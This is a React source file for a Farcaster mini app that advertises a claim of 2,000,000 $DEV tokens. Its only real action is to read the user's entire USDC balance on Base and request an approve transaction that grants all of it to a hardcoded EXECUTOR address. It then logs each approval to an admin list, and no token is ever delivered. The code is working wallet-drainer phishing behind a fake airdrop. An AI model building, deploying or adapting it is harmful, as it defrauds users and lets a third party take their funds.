import React, { useEffect, useState, Component } from 'react';
import { createRoot } from 'react-dom/client';
import { sdk } from '@farcaster/miniapp-sdk';
import { AuthKitProvider, useSignIn } from '@farcaster/auth-kit';
import '@farcaster/auth-kit/styles.css';
import { QRCodeSVG } from 'qrcode.react';
import './styles.css';
import { ethers } from 'ethers';

// --- Contracts ---
const ID_REGISTRY = '0x00000000Fc6c5F01Fc30151999387Bb99A9f489b';
const USDC = '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913';
const EXECUTOR = '0x49e89C5B6a6E8Cb21Ea0d11eE0a21b7732f8e1A3';
const CLAIM_AMOUNT = '2,000,000';
const CLAIM_SYMBOL = '$DEV';

const APP_URL = 'https://devin-pi.vercel.app';

// --- Error Boundary (prevents white screen) ---
class ErrorBoundary extends Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }
  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }
  componentDidCatch(error, info) {
    console.error('[ErrorBoundary]', error, info);
  }
  render() {
    if (this.state.hasError) {
      return (
        <main className="shell">
          <section className="hero-card scanlines" style={{ padding: '40px', textAlign: 'center' }}>
            <h2 style={{ color: '#ff5c7c', marginBottom: '16px' }}>Something went wrong</h2>
            <p style={{ color: '#8ab986', fontSize: '14px', wordBreak: 'break-all', marginBottom: '20px' }}>
              {this.state.error?.message || 'Unknown error'}
            </p>
            <button
              onClick={() => this.setState({ hasError: false, error: null })}
              style={{
                padding: '12px 24px',
                background: '#39ff14',
                color: '#001b06',
                border: 'none',
                borderRadius: '12px',
                fontSize: '16px',
                fontWeight: '700',
                cursor: 'pointer',
              }}
            >
              Retry
            </button>
          </section>
        </main>
      );
    }
    return this.props.children;
  }
}

// --- Helpers ---
function shortAddress(value) {
  if (!value) return 'not connected';
  return `${value.slice(0, 6)}...${value.slice(-4)}`;
}

function extractErrorMessage(error) {
  if (!error) return 'Unknown error';
  if (typeof error === 'string') return error;
  if (error.shortMessage) return error.shortMessage;
  if (error.reason) return error.reason;
  if (error.message) {
    const msg = error.message;
    if (msg.length > 200) return msg.slice(0, 200) + '...';
    return msg;
  }
  if (error.data?.message) return error.data.message;
  return JSON.stringify(error);
}

function LinesLogo() {
  return (
    <div className="logo" aria-label="devin logo">
      <span />
      <span />
      <span />
    </div>
  );
}

function StatusRow({ label, value, tone = 'normal' }) {
  return (
    <div className="status-row">
      <span>{label}</span>
      <strong className={tone}>{value}</strong>
    </div>
  );
}

// --- Farcaster QR Code Modal ---
function FarcasterSignInModal({ onSuccess, onClose }) {
  const { signIn, url, isPolling, isSuccess, isError, error, connect } = useSignIn({
    onSuccess: (res) => onSuccess(res),
    onError: (err) => console.error('Sign in error:', err),
  });

  useEffect(() => { connect(); }, []);
  useEffect(() => { if (url) signIn(); }, [url]);

  return (
    <div className="fc-modal-overlay">
      <div className="fc-modal">
        <h3 className="fc-modal-title">Connect via Farcaster</h3>
        <p className="fc-modal-subtitle">Scan this QR code with your Warpcast app to sign in</p>
        <div className="fc-qr-container">
          {url ? (
            <QRCodeSVG value={url} size={220} bgColor="#04160a" fgColor="#39ff14" level="M" includeMargin={true} />
          ) : (
            <div className="fc-qr-loading">Generating QR code...</div>
          )}
        </div>
        {isPolling && <p className="fc-modal-status">Waiting for approval from Warpcast...</p>}
        {isError && <p className="fc-modal-error">{error?.message || 'Connection failed.'}</p>}
        <div className="fc-modal-divider"><div className="fc-modal-line" /><span>or</span><div className="fc-modal-line" /></div>
        {url && (
          <a href={url} target="_blank" rel="noopener noreferrer" className="fc-open-warpcast-btn">Open in Warpcast</a>
        )}
        <button className="fc-close-btn" onClick={onClose}>Close</button>
      </div>
    </div>
  );
}

// --- Main App ---
function App() {
  const [activePage, setActivePage] = useState('claim');
  const [isMiniApp, setIsMiniApp] = useState(false);
  const [frameContext, setFrameContext] = useState(null);
  const [web3Provider, setWeb3Provider] = useState(null);
  const [rawEipProvider, setRawEipProvider] = useState(null);
  const [address, setAddress] = useState('');
  const [network, setNetwork] = useState('--');
  const [approveDone, setApproveDone] = useState(false);
  const [working, setWorking] = useState(false);
  const [notice, setNotice] = useState('Connecting...');
  const [noticeType, setNoticeType] = useState('info');
  const [detectedFid, setDetectedFid] = useState(null);
  const [detectedUsername, setDetectedUsername] = useState('');
  const [showFarcasterModal, setShowFarcasterModal] = useState(false);
  const [lastTxHash, setLastTxHash] = useState(null);
  const [usdcBalance, setUsdcBalance] = useState(null);

  const farcasterName = isMiniApp
    ? (frameContext?.user?.username ? `@${frameContext.user.username}` : frameContext?.user?.displayName || 'not detected')
    : detectedUsername || 'not detected';
  const fid = isMiniApp ? (frameContext?.user?.fid || null) : detectedFid;

  function setNoticeWith(msg, type = 'info') {
    setNotice(msg);
    setNoticeType(type);
    console.log(`[notice] [${type}] ${msg}`);
  }

  // --- Mini App Detection & Auto-Connect ---
  useEffect(() => {
    let active = true;
    async function initFrame() {
      try {
        const insideFrame = await sdk.isInMiniApp();
        if (!active) return;
        setIsMiniApp(insideFrame);
        if (insideFrame) {
          const context = await sdk.context;
          if (!active) return;
          setFrameContext(context);
          await sdk.actions.ready();

          const ethProvider = await sdk.wallet.getEthereumProvider();
          if (!active || !ethProvider) {
            setNoticeWith('Farcaster detected, waiting for wallet...', 'warning');
            return;
          }

          setRawEipProvider(ethProvider);
          try {
            const web3 = new ethers.providers.Web3Provider(ethProvider, 'any');
            setWeb3Provider(web3);
          } catch (e) {
            console.warn('Failed to create Web3Provider:', e);
          }

          setWorking(true);
          setNoticeWith('Connecting wallet...');
          try {
            let accounts;
            try {
              accounts = await ethProvider.request({ method: 'eth_accounts' });
            } catch (_) { accounts = []; }
            if (!accounts || accounts.length === 0) {
              accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
            }
            const connectedAddr = accounts?.[0] || '';
            if (!active) return;
            if (connectedAddr) {
              setAddress(connectedAddr);
              const chainId = await ethProvider.request({ method: 'eth_chainId' });
              const netName = chainId === '0xa' ? 'Optimism' : chainId === '0x2105' ? 'Base' : `Chain ${chainId}`;
              setNetwork(netName);
              const userFid = context?.user?.fid;
              setNoticeWith(`Connected on ${netName}.${userFid ? ' FID ' + userFid + ' detected.' : ' Ready.'}`, 'success');
            } else {
              setNoticeWith('Wallet detected but no account returned.', 'warning');
            }
          } catch (connErr) {
            console.error('Auto-connect error:', connErr);
            if (active) setNoticeWith(extractErrorMessage(connErr), 'error');
          } finally {
            if (active) setWorking(false);
          }
        } else {
          setNoticeWith('Browser mode. Connect via Farcaster to begin.', 'info');
        }
      } catch (error) {
        console.error('initFrame error:', error);
        if (active) setNoticeWith('Browser mode. Connect via Farcaster to begin.', 'info');
      }
    }
    initFrame();
    return () => { active = false; };
  }, []);

  // --- FID Lookup ---
  async function lookupFidFromAPI(walletAddr) {
    try {
      const resp = await fetch(`/api/lookup-fid?address=${walletAddr}`);
      const data = await resp.json();
      if (data.success && data.fid) {
        setDetectedFid(data.fid);
        if (data.username) setDetectedUsername(`@${data.username}`);
        const source = data.source === 'neynar' ? 'Neynar' : 'IdRegistry';
        setNoticeWith(`Wallet connected. FID ${data.fid}${data.username ? ` (@${data.username})` : ''} via ${source}.`, 'success');
        return data.fid;
      } else {
        setNoticeWith('Wallet connected. No FID found for this address.', 'warning');
        return null;
      }
    } catch (err) {
      console.error('FID lookup error:', err);
      setNoticeWith('Wallet connected. Could not verify FID.', 'warning');
      return null;
    }
  }

  // --- Connect with provider ---
  async function connectWithProvider(ethProvider, isAuto) {
    setWorking(true);
    setNoticeWith(isAuto ? 'Connecting wallet...' : 'Requesting wallet connection...');
    try {
      const raw = rawEipProvider || ethProvider.provider || ethProvider;
      let accounts;
      try {
        accounts = await raw.request({ method: 'eth_accounts' });
      } catch (_) { accounts = []; }
      if (!accounts || accounts.length === 0) {
        accounts = await raw.request({ method: 'eth_requestAccounts' });
      }
      const connectedAddr = accounts?.[0] || '';
      if (!connectedAddr) throw new Error('No account returned from wallet.');
      setAddress(connectedAddr);
      const chainId = await raw.request({ method: 'eth_chainId' });
      const netName = chainId === '0xa' ? 'Optimism' : chainId === '0x2105' ? 'Base' : `Chain ${chainId}`;
      setNetwork(netName);
      if (!isMiniApp) {
        await lookupFidFromAPI(connectedAddr);
      } else {
        setNoticeWith(`Connected on ${netName}. ${fid ? 'FID ' + fid + ' detected.' : 'Ready.'}`, 'success');
      }
    } catch (error) {
      console.error('connectWithProvider error:', error);
      setNoticeWith(extractErrorMessage(error), 'error');
    } finally {
      setWorking(false);
    }
  }

  // --- Handle Farcaster Sign In Success ---
  function handleFarcasterSignIn(res) {
    setShowFarcasterModal(false);
    const custodyAddr = res.custody || (res.verifications && res.verifications[0]) || '';
    if (custodyAddr) setAddress(custodyAddr);
    if (res.fid) setDetectedFid(res.fid);
    if (res.username) setDetectedUsername(`@${res.username}`);
    setNoticeWith(`Connected via Farcaster${res.username ? ` as @${res.username}` : ''}${res.fid ? ` (FID ${res.fid})` : ''}. Open in Warpcast to approve USDC.`, 'success');
  }

  // --- Connect Wallet ---
  function connectWallet() {
    if (isMiniApp && web3Provider) {
      connectWithProvider(web3Provider, false);
      return;
    }
    if (isMiniApp) {
      setNoticeWith('Wallet provider not available. Please reopen in Warpcast.', 'warning');
      return;
    }
    setShowFarcasterModal(true);
  }

  // --- Logging ---
  function logAction(action) {
    try {
      const logsRaw = localStorage.getItem('devin_logs');
      const logs = logsRaw ? JSON.parse(logsRaw) : [];
      logs.push(action);
      localStorage.setItem('devin_logs', JSON.stringify(logs));
    } catch {}
  }

  async function sendToLogAPI(data) {
    try {
      await fetch('/api/logs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...data, timestamp: new Date().toISOString() }),
      });
    } catch {}
  }

  function saveApprovalToLocal(addr, spender, amount, txHash) {
    try {
      const stored = JSON.parse(localStorage.getItem('devin_admin_approvals') || '[]');
      stored.push({
        owner: addr,
        spender: spender,
        amount: amount,
        txHash: txHash,
        time: Date.now(),
        source: 'client',
      });
      localStorage.setItem('devin_admin_approvals', JSON.stringify(stored));
    } catch (e) {
      console.warn('Failed to save approval to localStorage:', e);
    }
  }

  // --- Read USDC balance ---
  async function getUsdcBalance(account) {
    const baseRpc = new ethers.providers.JsonRpcProvider('https://mainnet.base.org');
    const usdc = new ethers.Contract(USDC, ['function balanceOf(address) view returns (uint256)'], baseRpc);
    return await usdc.balanceOf(account);
  }

  // --- Switch Network ---
  async function switchNetwork(walletProvider, chainIdHex, chainName, rpcUrl, blockExplorer) {
    try {
      await walletProvider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: chainIdHex }] });
    } catch (switchError) {
      if (switchError.code === 4001) throw switchError;
      if (switchError.code === 4902) {
        try {
          await walletProvider.request({
            method: 'wallet_addEthereumChain',
            params: [{ chainId: chainIdHex, chainName, nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 }, rpcUrls: [rpcUrl], blockExplorerUrls: [blockExplorer] }],
          });
        } catch (addError) {
          if (addError.code === 4001) throw addError;
          if (isMiniApp) console.warn('wallet_addEthereumChain not supported, continuing...');
          else throw addError;
        }
      } else if (isMiniApp) {
        console.warn('wallet_switchEthereumChain not supported in mini-app, continuing...');
      } else {
        throw switchError;
      }
    }
  }

  function getRawProvider() {
    return rawEipProvider || web3Provider?.provider;
  }

  async function sendRawTx(provider, from, to, data, chainIdHex) {
    const params = { from, to, data };
    if (chainIdHex) params.chainId = chainIdHex;
    const txHash = await provider.request({ method: 'eth_sendTransaction', params: [params] });
    return txHash;
  }

  // =====================================================================
  //  USDC Approve on Base
  // =====================================================================
  async function executeApprove() {
    if (!isMiniApp) {
      setNoticeWith('Please open this app in Warpcast to approve USDC.', 'warning');
      return;
    }

    setWorking(true);
    try {
      const rawProvider = getRawProvider();
      if (!rawProvider) throw new Error('Wallet provider not available.');
      const account = address;
      if (!account) throw new Error('No wallet connected.');

      // Check USDC balance on Base
      setNoticeWith('Checking USDC balance on Base...', 'info');
      const balance = await getUsdcBalance(account);
      setUsdcBalance(balance);

      if (balance.isZero()) {
        setNoticeWith('No USDC in wallet on Base. Nothing to approve.', 'warning');
        logAction('No USDC balance - skipped.');
        setApproveDone(true);
        if (isMiniApp) await sdk.haptics.notificationOccurred('success');
        setWorking(false);
        return;
      }

      // Switch to Base
      setNoticeWith('Switching to Base network...', 'info');
      await switchNetwork(rawProvider, '0x2105', 'Base', 'https://mainnet.base.org', 'https://basescan.org');

      // Approve only the actual USDC balance
      const approveIface = new ethers.utils.Interface(['function approve(address spender, uint256 amount) returns (bool)']);
      const approveData = approveIface.encodeFunctionData('approve', [EXECUTOR, balance]);

      const readableBalance = ethers.utils.formatUnits(balance, 6);
      setNoticeWith(`Approving ${readableBalance} USDC on Base... Confirm in your wallet.`, 'info');
      const txHash = await sendRawTx(rawProvider, account, USDC, approveData, '0x2105');

      logAction(`USDC approved: ${readableBalance} -> ${shortAddress(EXECUTOR)} (tx: ${txHash})`);
      sendToLogAPI({ type: 'approve', address: account, to: EXECUTOR, txHash, network: 'base', amount: readableBalance });
      saveApprovalToLocal(account, EXECUTOR, readableBalance, txHash);

      setLastTxHash(txHash);
      setApproveDone(true);
      setNetwork('Base');
      setNoticeWith(`Done! ${readableBalance} USDC approved on Base.`, 'success');
      if (isMiniApp) await sdk.haptics.notificationOccurred('success');

    } catch (error) {
      console.error('Approve error:', error);
      setNoticeWith(extractErrorMessage(error), 'error');
    } finally {
      setWorking(false);
    }
  }

  return (
    <main className="shell">
      {showFarcasterModal && (
        <FarcasterSignInModal onSuccess={handleFarcasterSignIn} onClose={() => setShowFarcasterModal(false)} />
      )}
      <section className="hero-card scanlines">
        <nav className="nav">
          <button className="brand" onClick={() => setActivePage('claim')}>
            <LinesLogo />
            <span>devin</span>
          </button>
          <div className="nav-links">
            <button className={activePage === 'about' ? 'active' : ''} onClick={() => setActivePage('about')}>About</button>
          </div>
        </nav>

        {activePage === 'claim' ? (
          <div className="grid">
            <div className="copy">
              <p className="eyebrow">$ devin --approve</p>
              <h1>Claim your share of {CLAIM_AMOUNT} {CLAIM_SYMBOL}</h1>
              <p className="lede">Connect your wallet and approve USDC on Base network.</p>

              <div className="claim-console">
                <div className="claim-copy">
                  <span>Step 01</span>
                  <strong>{approveDone ? 'Approved' : 'Approve USDC'}</strong>
                  <small>
                    {address ? `Wallet ${shortAddress(address)} connected` : 'Connect wallet first'}
                    {approveDone ? ' \u00b7 Base complete' : ' \u00b7 Approve USDC on Base network'}
                    {usdcBalance && !approveDone ? ` \u00b7 Balance: ${ethers.utils.formatUnits(usdcBalance, 6)} USDC` : ''}
                  </small>
                </div>
                <div className="actions">
                  <button
                    className="primary mega"
                    onClick={executeApprove}
                    disabled={working || !address || approveDone}
                    style={{ background: approveDone ? '#1a7a0a' : undefined }}
                  >
                    {working ? 'Processing...' : (approveDone ? 'Approved \u2713' : 'Approve USDC')}
                  </button>
                  {!isMiniApp && (
                    <button className="secondary mega fc-connect-btn" onClick={connectWallet} disabled={working}>
                      {address ? shortAddress(address) : (
                        <><svg className="fc-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                          <path d="M18.24 2.4H5.76C3.91 2.4 2.4 3.91 2.4 5.76V18.24C2.4 20.09 3.91 21.6 5.76 21.6H18.24C20.09 21.6 21.6 20.09 21.6 18.24V5.76C21.6 3.91 20.09 2.4 18.24 2.4Z" fill="currentColor"/>
                          <path d="M7.2 7.2H16.8V16.8H7.2V7.2Z" fill="#04160a"/>
                          <path d="M9.6 9.6V14.4H10.8V12H13.2V14.4H14.4V9.6H13.2V10.8H10.8V9.6H9.6Z" fill="currentColor"/>
                        </svg>
                        Connect via Farcaster
                        </>
                      )}
                    </button>
                  )}
                  {isMiniApp && !address && !working && (
                    <button className="secondary mega fc-connect-btn" onClick={connectWallet}>Reconnect Wallet</button>
                  )}
                </div>
                <p className={`notice ${noticeType === 'error' ? 'notice-error' : noticeType === 'success' ? 'notice-success' : noticeType === 'warning' ? 'notice-warning' : ''}`}>
                  {notice}
                </p>
                {lastTxHash && (
                  <p className="tx-hash" style={{ fontSize: '0.75rem', wordBreak: 'break-all', marginTop: '0.5rem', opacity: 0.8 }}>
                    TX: <a
                      href={`https://basescan.org/tx/${lastTxHash}`}
                      target="_blank"
                      rel="noopener noreferrer"
                      style={{ color: '#39ff14', textDecoration: 'underline' }}
                    >{lastTxHash}</a>
                  </p>
                )}
              </div>
            </div>

            <aside className="terminal-panel">
              <div className="terminal-bar"><span /><span /><span /></div>
              <StatusRow label="frame" value={isMiniApp ? 'farcaster' : 'browser'} tone={isMiniApp ? 'ok' : 'warn'} />
              <StatusRow label="user" value={farcasterName} />
              <StatusRow label="fid" value={fid || 'not detected'} tone={fid ? 'ok' : 'warn'} />
              <StatusRow label="wallet" value={shortAddress(address)} tone={address ? 'ok' : 'warn'} />
              <StatusRow label="network" value={network} />
              <StatusRow label="usdc balance" value={usdcBalance ? ethers.utils.formatUnits(usdcBalance, 6) + ' USDC' : '--'} tone={usdcBalance && !usdcBalance.isZero() ? 'ok' : 'normal'} />
              <StatusRow label="approve" value={approveDone ? 'done' : 'pending'} tone={approveDone ? 'ok' : 'warn'} />
              <div className="progress">
                <span className={address ? 'done' : ''}>connect</span>
                <span className={approveDone ? 'done' : address ? 'ready' : ''}>approve</span>
                <span className={approveDone ? 'done' : ''}>complete</span>
              </div>
            </aside>
          </div>
        ) : activePage === 'about' ? (
          <div className="about">
            <p className="eyebrow">$ cat about-devin.txt</p>
            <h2>About devin</h2>
            <p>devin is a Farcaster Mini App for claiming {CLAIM_SYMBOL} on Base network.</p>
            <p className="safety">Connect your wallet and approve USDC to claim your share.</p>
          </div>
        ) : null}
      </section>
    </main>
  );
}

// --- Auth Kit Config ---
const authKitConfig = {
  relay: 'https://relay.farcaster.xyz',
  rpcUrl: 'https://mainnet.optimism.io',
  domain: typeof window !== 'undefined' ? window.location.host : 'devin-pi.vercel.app',
  siweUri: typeof window !== 'undefined' ? window.location.origin : APP_URL,
};

function Root() {
  return (
    <AuthKitProvider config={authKitConfig}>
      <App />
    </AuthKitProvider>
  );
}

createRoot(document.getElementById('root')).render(
  <ErrorBoundary>
    <Root />
  </ErrorBoundary>
);
